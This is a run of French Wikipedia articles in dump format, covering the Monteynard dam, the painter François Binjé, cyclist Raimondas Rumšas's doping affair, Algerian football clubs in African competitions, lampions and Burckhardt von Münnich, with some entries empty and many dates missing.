Plusieurs tremblements de terre ont eu lieu en 1963 à Monteynard, l'institut des risques majeurs de Grenoble et des sismologues estiment que ceux-ci ont été dus à la mise en eau du barrage.
Le lac de Monteynard-Avignonet est surplombé par des terrains instables, un glissement de terrain a eu lieu le à la combe d'Harmaliere, un autre à la combe du Mas pourrait concerner de mètres cubes.
La brutalité et l'imminence d'un risque de glissement sont toutefois sujettes à débat : un mouvement de grande ampleur est considéré comme peu probable selon les services de l'état, mais une procédure d'expropriation et d'expulsion des habitations situées dans la combe du Mas est néanmoins en cours.

</doc>
<doc id="1873604" url="https://fr.wikipedia.org/wiki?curid=1873604" title="François Binjé">
François Binjé

François Joseph Binjé, dit Frans ou Franz Binjé est un peintre paysagiste de marines et de vues de ville, né à Liège le et décédé à Schaerbeek le .
Binjé est un peintre, aquarelliste et pastelliste.
Schaerbeek a dénommé une de ses rues "Frans Binjé". François Binjé est inhumé au cimetière de Saint-Josse-ten-Noode.
Biographie.
Né en 1835 à Liège, il est l'élève de Henri Van der Hecht.
Bien que de formation autodidacte, il deviendra néanmoins professeur. Réaliste, son style finira par être influencé par l'impressionnisme. Finalement, il fera des émules.
Ce fonctionnaire des chemins de fer a fréquenté le groupe de Tervueren autour d'Hippolyte Boulenger (1837-1874) avec Théodore Baron.
Il fut assidu aux salons d'exposition régionaux dès 1874 et aussi internationaux (Berlin 1869 et Paris 1900).
Deux de ses œuvres figurent au catalogue de la galerie Giroux en 1927.
Il est bien représenté dans les collections du Musée d'Art Wallon de Liège.

</doc>
<doc id="1873605" url="https://fr.wikipedia.org/wiki?curid=1873605" title="Idrissa M'Barke">
Idrissa M'Barke



</doc>
<doc id="1873607" url="https://fr.wikipedia.org/wiki?curid=1873607" title="Lac du Monteynard">
Lac du Monteynard



</doc>
<doc id="1873608" url="https://fr.wikipedia.org/wiki?curid=1873608" title="Rue Victor Hugo (Bruxelles)">
Rue Victor Hugo (Bruxelles)

La rue Victor Hugo (en néerlandais : "Victor Hugostraat") est une rue bruxelloise de la commune de Schaerbeek qui va de la chaussée de Louvain à l'avenue de Roodebeek en passant par la rue du Radium, l'avenue Léon Mahillon, l'avenue Émile Max, l'avenue Milcamps, l'avenue Eugène Plasky, l'avenue de l'Opale et l'avenue Adolphe Lacomblé.
Description.
La numérotation des habitations va de 1 à 225 pour le côté impair et de 4 à 200 pour le côté pair.
Origine du nom.
La rue porte le nom de l'écrivain français Victor Hugo qui lors de son exil de 1851 à 1870 vécut, par périodes, à Bruxelles.

</doc>
<doc id="1873609" url="https://fr.wikipedia.org/wiki?curid=1873609" title="Lac de Lauvitel">
Lac de Lauvitel



</doc>
<doc id="1873611" url="https://fr.wikipedia.org/wiki?curid=1873611" title="Jeanne Lion">
Jeanne Lion

Clémence Jane Lion, née le à Paris 9 et morte le à Paris 17, est une actrice de théâtre et de cinéma française, connue aussi comme Jeanne Léonnec à ses débuts au cinéma.
Biographie.
Famille.
Clémence Jane Lion est née le rue de Maubeuge dans le du mariage le dans le de Pierre Auguste Edmond Lion (1848-1919), négociant puis expert-comptable, et d’Éveline Caroline Cohn (1856-1879). Clémence Jane perd sa jeune mère à l'âge de trois ans en 1879. Son père se remarie le à Paris dans le avec Ernestine Juliette Esther Piquard.
Le , elle épouse à Paris dans le Charles Massenet (1870-1914) dont elle aura deux fils. Veuve, elle épouse en secondes noces le à Paris dans le , l'artiste dramatique Henri Marcel Alphonse de Bellocq dit Henri Beaulieu.
Carrière professionnelle.
Elle est engagée par Paul Jorge au Théâtre des Variétés d'Anvers pour la saison 1911-1912.
En 1924, Henri Beaulieu et Jeanne Lion-Beaulieu ouvrent à l'École des Hautes Études Sociales un « cours de préparation à la vie publique pour tous ceux que leurs professions obligent à prendre la parole en public » pour le placement de voix et l'élocution.
En 1939, elle donne des leçons de diction à Paris, et a pour élève la belle-sœur de Serge Bogousslawsky, qui lui offre deux dessins en guise de cachets, faute de réussir à faire son portrait. Il s'illustre en volant au musée du Louvre le tableau d'Antoine Watteau "L'Indifférent". Un moment mêlée à l'affaire, Jeanne Lion sera finalement écartée de l’enquête sur le vol de "L'Indifférent".
Clémence Jane Lion meurt le dans le .

</doc>
<doc id="1873612" url="https://fr.wikipedia.org/wiki?curid=1873612" title="Jeanne (film, 1934)">
Jeanne (film, 1934)

Jeanne est un film français de Georges Marret sorti en 1934.

</doc>
<doc id="1873616" url="https://fr.wikipedia.org/wiki?curid=1873616" title="Georges Marret">
Georges Marret

Georges Marret est un avocat, réalisateur et producteur de cinéma français, né Georges Auguste Antoine Wladimir Marret à Paris 15 arrondissement le 15 mars 1891, mort à Méry-sur-Seine le à l'âge de 46 ans.
Biographie.
Marret épouse Jeanne Pauline Gauthier à Dijon le 2 février 1918.

</doc>
<doc id="1873618" url="https://fr.wikipedia.org/wiki?curid=1873618" title="Affaire Rumšas">
Affaire Rumšas



</doc>
<doc id="1873619" url="https://fr.wikipedia.org/wiki?curid=1873619" title="Raimondas Rumšas">
Raimondas Rumšas

Raimondas Rumšas, né le à Šilutė, est un coureur cycliste lituanien, professionnel entre 1996 et 2004. Double champion national, il a notamment remporté le Tour de Lombardie 2000 et le Tour du Pays basque 2001. Avant d'être disqualifié pour un contrôle positif à l'EPO sur le Tour d'Italie 2003, il avait la particularité d'avoir terminé les trois grands tours dans le top 10 en trois participations.
L'affaire Rumšas.
L'affaire Rumšas concerne, en 2002, Raimondas Rumšas et son épouse Edita Rumšienė, à l'issue du Tour de France 2002 où le coureur lituanien a terminé sur le podium ( au général).
L'interpellation en juillet 2002.
Le 28 juillet 2002, dernier jour du Tour de France, Edita Rumšienė est interpellée par les douanes près de l'entrée du tunnel du Mont-Blanc avec une voiture chargée de "produits suspects" : EPO, hormone de croissance, testostérone, anabolisants divers, et corticoïdes. Elle se préparait à traverser les Alpes par le tunnel du Mont-Blanc pour gagner la Toscane, où résidait le couple lituanien.
L'instruction.
Une information judiciaire a été ouverte pour « administration, offre, cession et aide à l'usage de produits dopants ». Jean-Marie Leblanc, le directeur du Tour de France, a été entendu par la police, qui souhaitait obtenir des informations, notamment sur le fonctionnement des contrôles antidopage. 
Les produits saisis dans la voiture d'Edita Rumšienė ont laissé les enquêteurs sceptiques quant à leur destination. « Vu les quantités de produits saisis, c'est que Rumšas était bien malade », ont déclaré les enquêteurs.
Le soutien des autorités lituaniennes.
Rumšas a reçu l'appui des autorités sportives lituaniennes qui ont elles-mêmes révélé les résultats de ses tests. « Le résultat du test (antidopage) du cycliste lituanien est négatif, ce qui signifie qu'il n'a consommé aucune substance prohibée », a indiqué dans un communiqué l'organisme chapeautant les organisations sportives lituaniennes. De fait, aucun contrôle antidopage du coureur lituanien ne s'est avéré positif sur le Tour 2002.
Le jugement en 2006.
Le , le tribunal correctionnel de Bonneville a prononcé quatre mois de prison avec sursis contre le couple et une amende contre Edita Rumšienė. Raimondas Rumšas n'a pas été déclassé du palmarès du Tour de France 2002, dont il est toujours troisième.
Autre scandale de dopage.
Le Lituanien a aussi été suspendu pour un an et condamné à une amende de 1 335 euros après un contrôle antidopage positif effectué lors du Tour d'Italie 2003. Le contrôle, pratiqué par l'U.C.I., démontrait que le coureur avait pris de l'érythropoïétine (EPO). Il avait été déclaré positif lors de la sixième étape du Giro, Maddaloni-Avezzano, disputée le .
Rumšas avait terminé le Giro à la sixième place. Il avait été suspendu par son équipe, la Lampre, dès son contrôle positif connu.
Le , son fils Linas, cycliste amateur de 21 ans au sein de l'équipe toscane Altopack-Eppela, est retrouvé mort, victime d'un arrêt cardiaque. En , une enquête est ouverte après la découverte de produits dopants au domicile familial. Cinq personnes dont Raimondas Rumšas sont concernées par cette enquête. Le de la même année, les médias rapportent que son deuxième fils, Raimondas Rumšas junior, âgé de 23 ans, a été contrôlé positif à une hormone de croissance le . L'enquête prouve l'existence d’un dopage organisé au sein de l'équipe de Linas Rumšas (le Gran Fondo del Diavolo), mais en septembre 2025, l'affaire est classée sans suite en raison de la prescription des faits. La lenteur de la justice italienne est pointée du doigt par les médias.
Résultats sur les grands tours.
Tour de France.
1 participation
Tour d'Italie.
1 participation
Tour d'Espagne.
1 participation

</doc>
<doc id="1873620" url="https://fr.wikipedia.org/wiki?curid=1873620" title="Henri Duvernois">
Henri Duvernois

Henri Duvernois, nom de plume de Simon Schwabacher, est un écrivain, scénariste et dramaturge français, né le à Paris, ville où il est mort le .
Biographie.
Né d’un père diamantaire hongrois qu’il perd à l’âge de 11 ans et d’une mère hollandaise, il entre, après de brèves études à 17 ans comme secrétaire de la Bibliothèque Charpentier et publie son premier roman "Les Vous et les Toi". 
Henri Duvernois a habité au 12 quai de Passy dans le .
Il fait du journalisme en faisant partie des premiers contributeurs à "La Critique" (mars 1895), en contribuant à des journaux comme la "Presse", la "Patrie", au "Soleil" et en collaborant à des revues telles "Le Journal", "Le Matin", "Femina", "Candide", l’hebdomadaire maurrassien et antisémite ou encore "L'Illustration".
En 1910, il épouse Margaretha Liebmann, plus connue sous le pseudonyme de Rita del Erido, alors célèbre écuyère de cirque.
Il écrit beaucoup, une trentaine de volumes, jusqu'en 1937 date de sa mort. Outre ses romans, il écrit des nouvelles comme "Les Marchandes d'Oubli", "Les Demoiselles de Perdition", "La Maison des Confidences", "Le Chien qui parle", "Fifinoiseau" et "La Lune de Fiel".
Œuvres.
"Liste très partielle"
Autobiographie.
"Apprentissages : souvenirs des années 1885-1900", Paris, 1930, Hachette, 217 p. 

</doc>
<doc id="1873621" url="https://fr.wikipedia.org/wiki?curid=1873621" title="Stearns">
Stearns



</doc>
<doc id="1873624" url="https://fr.wikipedia.org/wiki?curid=1873624" title="Vidocq (film, 1939)">
Vidocq (film, 1939)

Vidocq est un film français réalisé par Jacques Daroy d'après les mémoires d'Eugène-François Vidocq, sorti en 1939.

</doc>
<doc id="1873633" url="https://fr.wikipedia.org/wiki?curid=1873633" title="Église Saint-Marc de Belgrade">
Église Saint-Marc de Belgrade

L'église Saint-Marc de Belgrade (en serbe cyrillique : ; en serbe latin : ) est une église orthodoxe serbe située à Belgrade, la capitale de la Serbie, dans la municipalité de Palilula. Elle est inscrite sur la liste des monuments culturels protégés de la république de Serbie (identifiant SK 133) et sur la liste des biens culturels de la ville de Belgrade.
Localisation.
L'église est située dans le parc de Tašmajdan, non loin de l'Assemblée nationale.
Architecture.
L'église Saint-Marc, située 17 "Bulevar kralja Aleksandra" (le « Boulevard roi Alexandre »), a été construite de 1931 à 1940 par les architectes Petar et Branko Krstić. Avec ses dômes et ses arcades en plein-cintre, elle est caractéristique de l'architecture serbo-byzantine telle qu'elle se développa à Belgrade à la fin du et au début du et telle qu'on peut la voir, par exemple, dans l'église Saint-Sava. Cette architecture vernaculaire rappelle les églises orthodoxes du Serbie médiévale ; c'est ainsi que l'église Saint-Marc est inspirée par celle du monastère de Gračanica ().
Décoration.
En avril 2023, la décoration intérieure n'est pas achevée. Toutefois, les quelques représentations que l'on peut admirer sur les murs sont de magnifiques mosaïques de style byzantin. L'iconostase est, elle aussi, faite de mosaïques.
Crypte et trésor.
L'église abrite un sarcophage contenant les reliques de l'empereur serbe Stefan Dušan et, dans une crypte en marbre, celles du patriarche German Đorić (1899-1991). L'église Saint-Marc possède également une importante collection d'icônes des et s.

</doc>
<doc id="1873635" url="https://fr.wikipedia.org/wiki?curid=1873635" title="Joseph Xaupi">
Joseph Xaupi

Joseph Xaupi (ou Xaupy; en catalan : Josep Xaupi i Maris), né le à Perpignan et mort le à Paris, est un ecclésiastique, homme de lettres et érudit français. 
Biographie.
Joseph Xaupi est le fils de François Xaupi, médecin, devenu bourgeois honoré de Perpignan en 1699, et de Catherine Maris. Le grand-père paternel de l'abbé Xaupi, prénommé Joseph, qui nourrit des prétentions nobiliaires, considère cette union comme une mésalliance et tentera en vain de s'y opposer. 
Sa famille est aisée et a ses entrées dans la bonne société roussillonnaises ainsi qu'à Paris. 
Son père a hérité de nombreux bien immobiliers tant à Perpignan qu'à Estagel où se trouve le « château de Jau » qui est en fait une ancienne grange de l'Abbaye Sainte-Marie de Jau. En possession de ce « pseudo fief » acquis par leur trisaïeul, Miquel, "pagès" de son état (propriétaire exploitant agricole), les Xaupi se targuent depuis quelques générations du titre usurpé de « baron de jau ». 
Comme son frère Bonaventure, curé contesté de Saint-Laurent de Cerdans en 1716 , Joseph Xaupi avait fait ses études au Séminaire de Saint-Sulpice. 
Il avait ensuite acquis le titre de docteur en théologie de la Sorbonne en 1705. 
Peu après, il avait été nommé abbé commendataire de l'Abbaye Sainte-Marie de Jau, qui produisait alors de sept cents à six cents livres de revenus annuels, alors même qu'il n'avait pas encore été ordonné prêtre. 
Il obtient en 1724 un brevet royal pour la première place vacante à pourvoir au Chapitre de la Cathédrale Saint-Jean-Baptiste de Perpignan. Cette faveur du roi empiète sur les prérogatives du clergé local qui tente donc de s'y opposer. Dans cette polémique, Joseph Xaupi fait preuve d'une opiniâtreté peu commune dont il fera plus tard encore la démonstration dans l'affaire dite de la noblesse des bourgeois honorés de Perpignan. 
L'abbé Joseph Xaupi prend fait et cause jusqu'à son dernier souffle pour les bourgeois honorés dans le conflit qui les opposera au corps de la noblesse du Roussillon de 1738 à 1789 laquelle est alors représentée et défendue par une autre forte personnalité locale, le doyen de la faculté de droit de Perpignan et Bâtonnier de l'Ordre des Avocats, François de Fossa. Les deux partis par leur intermédiaire s'échangeront de nombreux mémoires auxquels ils donnent alors une grande publicité. Parmi les ouvrages de l'abbé Joseph Xaupi on cite généralement les "Recherches Historiques sur la noblesse des citoyens honorés de Perpignan et de Barcelone" publié à Paris en 1763. Mais plusieurs autres publications sont à mettre à son actif. Il est en particulier le principal auteur d'un grand in-folio imprimé à Perpignan en 1742 qu'il désavouera par la suite. 
Doyen de la faculté de théologie de Paris en 1724, l’abbé Xaupi était aussi l'un des « beaux esprits » de son temps. Il était membre et coopérateur de la « Paroisse » de Marie Anne Doublet de Persan, fille du fermier général François Legendre. 
Il avait beaucoup travaillé aux nouvelles à la main qui ont fait la base des "Mémoires secrets" de Bachaumont qui rapportent qu’« il était, comme beaucoup de ses confrères, croyant peu à ce qu’il enseignait, mais obligé de garder l’extérieur ; il avait pris parti pour le jansénisme, et s’était fait des querelles très vives avec son corps, qui lui avait fait interdire ses assemblées ». Brissot de Warville a dit de lui : « le vieil abbé Xaupi, homme d’esprit, qui ne croyait à rien, et s’était fait janséniste pour être quelque chose. »
Il montait en carrosse lorsqu’il se cassa la cuisse en tombant et il mourut des suites de cet accident.

</doc>
<doc id="1873637" url="https://fr.wikipedia.org/wiki?curid=1873637" title="Physics Report">
Physics Report



</doc>
<doc id="1873641" url="https://fr.wikipedia.org/wiki?curid=1873641" title="Historique du parcours africain des clubs algériens de football">
Historique du parcours africain des clubs algériens de football

Cet article présente les différentes performances des clubs algériens de football dans les compétitions officielles régies par la CAF. Cet article traite également des parcours de chaque club engagé suivant les saisons et en détail des finales disputées.
Introduction.
Depuis 1970, vingt-neuf clubs algériens ont évolué en compétitions africaines. Ceux-ci peuvent y participer chaque année suivant leurs résultats lors de la saison précédente dans les différentes compétitions nationales.
Durant les années 1960 aucun club algérien ne s'engage. Il faut savoir que les compétitions africaines de football sont relativement récentes et qu'il n'y avait que la Coupe d'Afrique des clubs champions, dont la première édition date de l'année 1964. Cela peut s'expliquer d'abord par le fait qu'à cette époque la plupart des pays africains acquirent récemment leurs indépendances. Tout le monde n'était pas au même niveau en termes de football, d'autre part il existait également d'autres compétitions de football dont le cadre géographique était restreint et ne représentait qu'une partie du continent africain. Celles-ci bien ancrés depuis le début des années 1960, la dimension continentale d'une épreuve était encore difficile à admettre et à tolérer, d'ailleurs les premières éditions seront organisés et remportés par des pays du centre et de l'Est du continent africain.
La première apparition d'un club algérien date de la saison 1969-1970, avec la participation du CR Belouizdad (qui portait alors le nom de CR Belcourt). Cette équipe talentueuse emmené par son meneur de jeu étincelant Hassen Lalmas, battit lors du match aller du premier tour (l'équivalent d'un seizième de finale) l'équipe sénégalaise ASC Jeanne d'Arc sur le score de cinq buts à trois. Toutefois les dirigeants du club préféreront déclarer forfait à la suite des menaces proférées par ceux du club sénégalais qui promirent l'enfer au match retour car mécontents du résultat de leur équipe.
À la suite de cette mésaventure, aucun club algérien ne voudra s'engager en Coupe d'Afrique des clubs champions pendant cinq ans. Il faudra attendre la saison 1975-1976 pour voir un autre club y participer. Il s'agit du MC Alger, qui réussira l'exploit de remporter la compétition dès sa première participation et cela en réalisant un triplée inédit Coupe d'Algérie - Championnat d'Algérie - Coupe d'Afrique.
D'autres compétitions que la coupe des clubs champions apparaissent dans le football africain et sont régies elles aussi par la CAF. La participation des clubs algériens à ces nouvelles compétitions se fait presque naturellement. Si le football algérien ne figure pas durant les cinq premières éditions de la Coupe d'Afrique des clubs champions (1964, 1966, 1967, 1968 et 1969), plus les cinq autres suivant la participation du CR Belouizdad en 1970 (1971, 1972, 1973, 1974 et 1975); il en sera de même pour les deux premières éditions de la Coupe d'Afrique des vainqueurs de coupe en 1975 et 1976. Par contre il sera présent lors de la création en 1992, de la Coupe de la CAF que l'on connait maintenant sous le nom de Coupe de la confédération, et le sera durant toutes les éditions.
Plusieurs clubs algériens ont donc participé à ces différentes compétitions, certains même plusieurs fois, mais seuls la JS Kabylie et l'ES Sétif ont franchi la barre symbolique des en coupes africaines, c'est également les deux clubs les plus titrés avec 7 et 3 titres respectivement, en plus de la C1, la JS Kabylie a la particularité d'être la seule équipe Algérienne à avoir aussi remporté la C2 et la C3 (compétition qui n'existe plus), seule la Coupe de la confédération et la Ligue africaine de football manquent à son palmarès. L'ES Sétif quant à elle et la seule équipe ayant réussi à remporter la C1 nouvelle formule lancée depuis 1997. La JS Kabylie avec ses trente participations toutes compétitions confondues; est le club qui compte le plus de participations devant l'ES Sétif qui en compte quatorze.
La période qui commence avec la victoire du MC Alger en 1976 jusqu'à la fin des années 1980 (victoire de la JS Kabylie en 1990), est la plus prolifique pour les clubs algériens qui remportèrent quatre titres et réalisèrent deux finales. Cette période verra même le football algérien réaliser trois finales consécutives en Coupe d'Afrique des clubs champions en 1988, 1989 et 1990.
Ensuite c'est le néant, certains clubs atteindront fréquemment les quarts de finale voir les demi-finales d'une compétition africaine; alors que d'autres feront des apparitions épisodiques où seule la participation semble être leurs résultats. Malgré les troubles que connut l'Algérie (la « décennie noire » de la Guerre civile algérienne), son football réussit tant bien que mal à survivre même s'il régresse quelque peu. Ceci est en partie dues aux bons résultats de la JS Kabylie qui réussit durant les années 1990 à se maintenir au niveau de ses rivaux maghrébins, en enchainant une victoire en 1990 en Coupe des clubs champions (ainsi qu'une demi-finale perdue de peu en 1996), une victoire en Coupe d'Afrique des vainqueurs de coupe de football en 1995; ainsi qu'une participation en supercoupe d'Afrique en 1996, la seule à ce jour d'un club algérien.
Compétitions de la confédération africaine de football (CAF).
Bilan des clubs algériens en compétitions africaines à partir de 1970 
Bilan général.
Le nombre de participations indiqué dans le tableau ci-dessous ne tient compte que d'une seule participation par saison, même si le club a été reversé en coupe de la confédération après son élimination de la ligue des champions.
(*) Dont une (1) "Supercoupe d'Afrique en 1982" (compétition non-CAF).
(**) Dont une (1) "Supercoupe de la CAF en 2015".
(***) Dont une (1) "Supercoupe de CAF en 2023."
Compétitions non CAF.
Supercoupe d'Afrique 1982.
L'idée d'une Supercoupe d'Afrique a germé et été introduite au Tournoi de la Fraternité. En janvier 1982, de par son statut de championne d'Afrique en 1981, la JE Tizi Ouzou reçoit une invitation à participer au Tournoi de la Fraternité en Côte d'Ivoire. La JET gagne ce trophée en disposant en finale de l'Union Douala, club camerounais vainqueur de la coupe d'Afrique des vainqueurs de coupes sur le score de 1 -1 après prolongation, 4 tirs au but à 3. Ce trophée est considéré comme une Supercoupe d'Afrique comme la presse de l’époque et la bible du football, France-Football qui écrit «Une nouvelle Supercoupe d’Afrique est née». Mais cette dernière a revu le jour officiellement en 1992. Elle est organisée par la CAF. (source le livre d'or du sport algérien pages 313 et 314).
Coupe afro-asiatique.
L'Entente sportive de Sétif est le seul club algérien à avoir gagné la Coupe afro-asiatique des clubs. Il obtient la coupe en 1989 contre Al Sadd Sports Club du Qatar, victoires en match aller et retour.

</doc>
<doc id="1873642" url="https://fr.wikipedia.org/wiki?curid=1873642" title="Lampion">
Lampion

Un lampion est une petite lanterne traditionnelle décorative d'origine chinoise, en papier, soie, verre, terre, pierre, bambou, ou fer blanc..., éclairée par une bougie, ou avec une mèche et du suif ou de l'huile, ou une ampoule, variante des lanterne flottante et lanterne céleste. 
Histoire.
Il existe une importante variété de formes de lampions (formes traditionnelles d'éclairage au Japon, ou en Chine) généralement de couleurs chaudes, et décorés avec des motifs ou inscriptions asiatiques, inspirés du style traditionnel ancestral des éventails, et des éléments d'habitats en papier byōbu, shōji et fusuma des washitsu de l'habitat japonais traditionnel, ou encore aux plantes botaniques physalis... 
Culture asiatique.
Les lampions traditionnels sont communs en Chine, au Japon ("chōchins"), et dans tous les quartiers asiatiques Chinatowns du monde, dans les rues, les commerces, les temples, décors d'intérieurs, ou événements festifs traditionnels ou religieux (lanterne flottante, lanterne céleste, fête des lampions de Nihonmatsu au Japon...)...
Culture hispanique et italienne.
Pour les fêtes de Noël, les communautés catholiques italiennes, et hispaniques, ont l'habitude de mettre des bougies classiques ou de type chauffe-plat dans de petits sacs en papier blanc, sous le nom de "" ou "farolitos".
Culture lyonnaise.
Lors de la Fête des Lumières de Lyon (fête de la Vierge Marie du 8 décembre) la ville de Lyon est entre autres décorée de milliers de bougies-lampions. 
Lampions sculptés dans des légumes.
Halloween.
Les lampions sont traditionnellement utilisés pour célébrer la fête d'Halloween. Également appelés citrouilles-lanternes, ces lampions sont associés aux termes anglais "jack-o'-lantern" et "will-o-the-wisp" qui seraient dérivé d'un vieux conte irlandais.
La noyade des lampes (Vosges).
Au et fort probablement avant, dans la région de Saint-Dié-des-Vosges, la clôture des veillées de l’hiver tombait le jour de la saint Grégoire-le-Grand, le . La veille, on célébrait « la noyade des lampes », en disposant des lampions. Ils étaient disposés sur les fontaines par les jeunes gens. Ils prenaient un navet, le plus gros possible, et lui donnaient la forme d'une tête de mort, et, avec un peu d'huile et une mèche, ils en faisaient un lampion. Ceux qui passaient à côté devaient faire en sorte de l'enlever ou de l'éteindre. .
La Saint-Martin (Flandres).
Au début du , en Flandres, notamment à Dunkerque, on fêtait la Saint-Martin (fête) (le ) au moyen de lampions. Un témoin né en 1910 rapporte que dans son enfance, les enfants fabriquaient des lampions, avec de l'étoupe dans des betteraves.

</doc>
<doc id="1873643" url="https://fr.wikipedia.org/wiki?curid=1873643" title="Claude Guimond de La Touche">
Claude Guimond de La Touche

Claude Guimond de La Touche, né le à Châteauroux et mort le à Paris, est un poète tragique français.
Biographie.
Fils d’un procureur du roi au bailliage; il a accompli ses études chez les jésuites de Rouen. Entré dans leur Société des le , il a étudié les lettres, l’histoire, la philosophie, et professé ces matières au collège de Rouen jusqu’en 1748. À la suite de tracasseries ordinaires dans les congrégations religieuses, il est rentré, au bout de quatorze ans, dans la vie civile, et s’est consacré aux lettres.
Il débute par une ode sur la naissance du duc de Bourgogne, intitulée : "Mars au berceau" (, in-8°). La seule tragédie qu’il ait composée et qui a fait vivre son nom, "Iphigénie en Tauride", a été représentée au Théâtre-Français le . Selon en croit mademoiselle Clairon, le cinquième acte, dont les comédiens n’étaient pas contents, a été refait en entier, le jour même, par l’auteur, et pourtant le rideau a été se levé à cinq heures et demie.
Le succès d’"Iphigénie en Tauride" a été tout d’enthousiasme. Guimond, redemandé à grands cris, se laissa amener sur la scène et s’évanouit de joie en se retirant. Sa pièce, remarquable à plusieurs égards et restée comme une des meilleures tragédies de second ordre, fut pourtant maltraitée par Fréron, Grimm et Geoffroy qui l’a appelée une « farce burlesque », un « fatras extravagant ».
À l’imitation des Grecs, ou simplement à l’exemple de Collé, l’auteur a rempli son sujet, sans y introduire d’épisodes d’amour, et le maintien de la simplicité du plan d’Euripide n’a manqué ni d’intérêt ni de pathétique. Beaucoup d’emprunts ont été signalés : la scène de la reconnaissance était tirée tout entière de l’opéra d’"Iphigénie" de Duché de ( ; celle où Iphigénie interroge Oreste sur le sort de la famille des Atrides, et dont le fond est dans Euripide, rappelait par quelques détails l’"Oreste et Pylade" de Lagrange-Chancel (), mais en l’améliorant. On a également reproché à l’auteur d’avoir exagéré sans utilité pour l’action la stupide férocité de Thoas, et de n’avoir pas assez préparé ni motivé le dénouement. Quant au style, on a dit que la versification pesante, monotone, les morceaux déclamatoires et les fautes de langue d’"Iphigénie en Tauride" étaient sauvés par l’énergie, la chaleur qui animaient l’ensemble de l’œuvre qui a été imprimée plusieurs fois (Paris, , 1778, , , , , in-8°).
On a encore de Guimond de La Touche : "Épître à l’amitié" (Londres, , in-8°) ; "les Soupirs du cloître, ou le Triomphe du fanatisme" (, in-8°), satire contre ses anciens confrères, les Jésuites.
Guimond de La Touche travaillait à une tragédie de "Régulus", dont il avait déjà fait trois actes, qui n'ont pas été retrouvés, quand il est mort d'une fluxion de poitrine.

</doc>
<doc id="1873646" url="https://fr.wikipedia.org/wiki?curid=1873646" title="Burckhardt Christoph von Münnich">
Burckhardt Christoph von Münnich

Burckhardt Christoph von Münnich ( à Neuenhuntorf, Comté d'Oldenbourg – à Saint-Pétersbourg) est un militaire et ingénieur allemand ayant servi le royaume de France, le Landgraviat de Hesse-Darmstadt puis celui de Hesse-Cassel, l'Électorat de Saxe et finalement la Russie. Son nom est russifié en Khristofor Antonovitch Minikh ("Христофо́р Анто́нович Миних"). Il est nommé maréchal d'armée russe et réforme les armées. Puis, il est fait comte en remerciement de ses hauts faits. Il occupe aussi le poste de Premier ministre, puis est exilé en Sibérie.
Biographie.
Jeunesse.
Son père, Anton Günther von Münnich, est lieutenant-colonel et inspecteur-général en Frise du Nord. Sa famille s'est spécialisée dans l'architecture hydraulique. Son père le forme dès l'enfance. Fils de gentilhomme allemand, il est élevé parmi des membres de la noblesse danoise.
Münnich vient en France, à l'âge de seize ans, en 1699. Il est fasciné par Catinat et le maréchal de Luxembourg. Il obtient alors une place d'ingénieur dans l'armée d'Alsace à Strasbourg.
Cependant, du fait de la Guerre de Succession d'Espagne, il repart pour l'Allemagne, où il obtient en 1701, à l'âge de dix-huit ans, une compagnie dans les troupes du landgrave de Hesse. Il combat au siège de Landau.
Son père, devenu le conseiller du duc de Frise orientale, le fait venir auprès de lui et nommer ingénieur en chef de ce pays. En 1706, il reprend du service dans l'armée du landgrave de Hesse et rejoint les troupes du prince Eugène en Italie. Burckhardt de Münnich reçoit le grade de major de la Garde à pied après avoir participé à la bataille de Castiglione et à la prise de plusieurs forteresses.
Münnich passe en Flandres, assiste à la bataille d'Audenarde et se trouve au siège des principales villes du pays. Il se distingue à la bataille de Malplaquet et est nommé lieutenant-colonel. Münnich est « laissé pour mort » et fait prisonnier à la bataille de Denain (1712). On le conduit à Cambrai, où il fait partie de ces prisonniers traités avec tant d'humanité par Fénelon. Il paie lui-même sa rançon.
En 1713, il revient dans sa patrie, où il est nommé colonel. Le landgrave de Hesse le charge du plan d'un canal, destiné à joindre la Fulda à la Weser. Il construit des écluses à Carlshaven et le canal de Grabenstein.
En 1716, Münnich entre au service de la Pologne du prince-électeur de Saxe, futur roi de Pologne, avec bientôt le grade de général-major et d'Inspecteur général des armées polonaises. Il tue en duel le colonel français Bonnefoux, comme lui au service de la Pologne. Le comte de Fleming le fait éloigner de la Pologne, par jalousie.
Au service de Pierre le Grand.
En février 1721, à l'invitation de l'ambassadeur russe à Varsovie, le prince Grigori Dolgorouki, il se rend à Saint-Pétersbourg.
Münnich est employé, tout d'abord, comme ingénieur-général, en Russie. Le tsar Pierre le Grand l'emmène avec lui, pour dresser de nouveaux plans pour l'amirauté, le port de Cronstadt et les fortifications de Riga. Néanmoins, il reconstruit ses ports, ses forts, pave les rues et les routes, construit des canaux. 
En 1723, Münnich reçoit la mission de continuer les travaux commencés par Pisarev, protégé du prince Menchikov. Il doit unir le grand canal du lac Ladoga, la Volochov, à la Néva. Sous sa direction, les travaux avancent vite.
L'empereur, malade, va jusqu'à dire : « J'espère que les travaux de Münnich me guériront », mais il meurt en 1725. Catherine, son épouse, devient impératrice.
Au service de Catherine.
Münnich sait se maintenir en crédit, malgré la haine de Menchikov, favori de l'impératrice. Avec l'aide de , il termine le canal le . La navigation peut y être ouverte, au grand désespoir du prince Menchikov.
Dans le même temps, Münnich reconstruit la forteresse Pierre-et-Paul, en pierre. Il participe à la reconstruction de Kronstadt et fait les plans pour renforcer et moderniser les fortifications de Vyborg et Schlüsselbourg. Pour le récompenser, il est nommé général de corps d'armée en 1727. Il n'a que quarante-quatre ans.
Catherine décède en 1727. Pierre II devient empereur, le . Trop jeune pour diriger personnellement le gouvernement, il laisse le pouvoir passer aux mains de la famille Dolgoroukov qui prend le contre-pied de la politique menée par Pierre le Grand. Pierre II passe, quant à lui, sous l'autorité de Menchikov.
Au service de Pierre II.
 gouverneur du duché d'Ingrie, de la Carélie et de la Finlande, en 1728. Il est aussi nommé général en chef et fait comte russe et décoré de l'ordre de Saint-Alexandre Nevski.
Le comte Burckhardt de Münnich, se remarie le à Saint-Pétersbourg, avec Barbara Éléonore de Maltzahn (1691-1774), gouvernante de la grande-duchesse Élisabeth, future impératrice. Il était veuf de Christiane Lucretia et avait plusieurs enfants, dont Louise (1713-1775), Ernst de Munnich (1707-1788) et Sophie.
Dans le même temps, de 1728 à 1729, le comte Minikh (ou Münnich) compile la collection héraldique de Russie qui sera approuvée en 1730 par l'impératrice Anne, car entre-temps Pierre II meurt de la petite vérole le et la duchesse de Courlande est devenue l'impératrice Anne.
Réforme de l'armée russe.
